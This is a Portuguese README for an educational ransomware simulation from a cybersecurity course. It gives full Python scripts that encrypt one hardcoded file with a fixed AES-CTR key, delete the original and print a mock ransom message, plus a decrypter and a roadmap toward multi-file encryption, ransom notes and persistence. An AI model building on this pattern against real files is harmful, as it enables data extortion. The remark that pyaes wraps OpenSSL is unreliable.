<div align="center">

# 🔒 Simulação de Ransomware em Python - DIO Formação Cybersecurity Specialist 🛡️

[![Python](https://img.shields.io/badge/Python-3.x-3776AB?style=for-the-badge&logo=python&logoColor=yellow)](https://www.python.org/)
[![Kali Linux](https://img.shields.io/badge/Kali_Linux-%2300A300?style=for-the-badge&logo=kali-linux&logoColor=white)](https://www.kali.org/)
[![GitHub](https://img.shields.io/badge/GitHub-lehidavet-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lehidavet)
[![Cybersecurity](https://img.shields.io/badge/Cybersecurity-DIO-red?style=for-the-badge&logo=data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDUiIGhlaWdodD0iNDUiIHZpZXdCb3g9IjAgMCA0NSA0NSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj48cGF0aCBkPSJNMTguNzIgMjguNjhjMC0uMjgtLjIzLS41Mi0uNTEtLjUySDE1LjY3Yy0uMjggMC0uNTEuMjQtLjUxLjUydi41M2MwIC4yOC4yMy41MS41MS41MWgxMi41NGMuMjggMC0uNTEuMjQtLjUxLjUydi0uNTN6IiBmaWxsPSIjRkZGRkZGIi8+PHBhdGggZD0iTTE4LjcyIDE4Ljk1YzAgLS4yOC0uMjMtLjUyLS41MS0uNTJIMTUuNjdjLS4yOCAwLS41MS4yNC0uNTEuNTJ2NS4yOGMwIC4yOC4yMy41MS41MS41MWgxMi41NGMuMjggMC0uNTEuMjQtLjUxLjUydjUuMjhjMCAuMjguMjMuNTEuNTEuNDFoMi41NGMyLjgzIDAgNS4xNS0yLjMyIDUuMTUtNS4xNVMyMS41NSAxOC45NSAxOC43MiAxOC45NXoiIGZpbGw9IiNGRkZGRkYiLz48L3N2Zz4=)](https://www.dio.me/)

</div>

## 📋 **Descrição do Projeto**

Este projeto simula o funcionamento básico de um **ransomware** usando **Python** e a biblioteca `pyaes` para criptografia **AES-CTR**. O objetivo educacional é entender como ransomwares criptografam arquivos e como revertê-los com uma chave conhecida.

> ⚠️ **ATENÇÃO**: Use **APENAS** em ambiente controlado e isolado (máquinas virtuais) para fins **didáticos**. **NUNCA** execute em sistemas reais!

**Desenvolvido** como desafio da **Formação Cybersecurity Specialist DIO**, inspirado em [cassiano-dio/cibersecurity-desafio-ransomware](https://github.com/cassiano-dio/cibersecurity-desafio-ransomware).

---

## 🛠️ **Tecnologias Utilizadas**

```mermaid
graph TB
    A[Python 3.13.7] --> B[pyaes AES-CTR]
    B --> C[Kali Linux]
    C --> D[VirtualBox Home Lab]
    A --> E[Git/GitHub]
```

**Instalação da dependência:**
```bash
pip install pyaes
```

---

## 📁 **Estrutura do Projeto**

```text
simulacao-ransomware-kali-python/
├── 🔐 encrypter.py
├── 🔓 decrypter.py
├── 📄 README.md
└── 🖼️ images/
│   ├── ransomware-ls.jpg
│   ├── ransomware-ls-final.jpg
│   ├── ransomware-nano-decrypt.jpg
│   └── ransomware-nano-encrypt.jpg
```
---

## 🚀 **Como Funciona**

### 1️⃣ **Criptografia** (`encrypter.py`)
- Lê `teste.txt`
- Criptografa com **AES-CTR** (chave: `b"testeransomwares"`)
- Remove original
- Salva como `teste.txt.ransomwaretroll`

### 2️⃣ **Descriptografia** (`decrypter.py`)
- Lê arquivo criptografado
- Descriptografa com mesma chave
- Remove criptografado
- Restaura `teste.txt`

**📝 Decisões Técnicas:**
- Chave fixa (demo apenas)
- **CTR mode**: sem padding necessário
- 1 arquivo por execução

---

## 📸 **Demonstração - Kali Linux**

### **📋 Lista inicial de arquivos:**
![Lista inicial](./images/ransomware-ls.png)

### **✏️ Editando teste.txt no nano:**
![Nano encrypt](./images/ransomware-nano-encrypt.png)

### **🔒 Após criptografia:**
![Lista final](./images/ransomware-ls-final.png)

### **🔓 Descriptografando:**
![Nano decrypt](./images/ransomware-nano-decrypt.png)

---

### **🔐 encrypter.py**
```python
import os
import pyaes

# Abrir arquivo a ser criptografado
file_name = 'teste.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

# Remover o arquivo original
os.remove(file_name)

# Definir a chave de encriptação
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado
new_file = file_name + '.ransomwaretroll'
with open(new_file, 'wb') as f:
    f.write(crypto_data)

print("💰 Arquivo criptografado! Pague o resgate ou use decrypter.py 🤑")
```

### **🔓 decrypter.py**
```python
import os
import pyaes

# Abrir arquivo criptografado
file_name = 'teste.txt.ransomwaretroll'
with open(file_name, 'rb') as f:
    file_data = f.read()

# Chave de descriptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)
decrypt_data = aes.decrypt(file_data)

# Remove o arquivo criptografado
os.remove(file_name)

# Criar novo arquivo descriptografado
with open('teste.txt', 'wb') as f:
    f.write(decrypt_data)

print("✅ Arquivo descriptografado com sucesso! 🚀")
```

---

## 🎯 **Como Executar**

```bash
# 1. Crie teste.txt
echo "Este arquivo esta legivel e descriptografado" > teste.txt

# 2. Mostrar arquivos na pasta  
ls

# 3. Criptografar
python encrypter.py

# 4. Verificar (arquivo .ransomwaretroll)
ls
nano teste.txt.ransomwaretroll

# 5. Descriptografar
python decrypter.py

# 6. Mostrar novamente arquivos da pasta  
ls

# 5. Verificar (teste.txt restaurado!)
nano teste.txt
```

✅ **Testado em**: Kali Linux (VirtualBox Home Lab)

---

## 🧠 **Aprendizado & Próximos Passos**

### **✅ O que aprendi:**
- **AES-CTR**: Modo stream cipher (nonce implícito)
- **pyaes**: Wrapper simples para OpenSSL
- **File I/O**: Manipulação segura com `with`

### **🚀 Melhorias futuras:**
- Criptografar **múltiplos arquivos**
- Nota de resgate **HTML**
- Chave derivada (**PBKDF2**)
- Persistência (cron/systemd)

---

## 👤 **Autor**

**Lehi Davet**  
**🔄 Transição de Carreira**: Eng. Mecânico → Cybersecurity  
**📍 Água Verde, Paraná, Brasil**  
**💼 LinkedIn**: [lehidavet](https://linkedin.com/in/lehidavet)  
**🐙 GitHub**: [lehidavet](https://github.com/lehidavet)

<div align="center">
  
[![Portfolio](https://img.shields.io/badge/Portfolio-lehidavet-blueviolet?style=for-the-badge&logo=gitbook&logoColor=white)](https://lehidavet.github.io)
[![Email](https://img.shields.io/badge/Email-lehi_davet%40hotmail.com-red?style=for-the-badge&logo=gmail&logoColor=white)](mailto:lehi_davet@hotmail.com)

</div>

## ⚖️ **Aviso Legal**

**🎓 Simulação 100% educacional.**  
Ransomwares reais são **crimes** (Lei 14.155/2021 - Brasil).

---

*Desenvolvido durante DIO Formação Cybersecurity Specialist • Março 2026 🇧🇷*
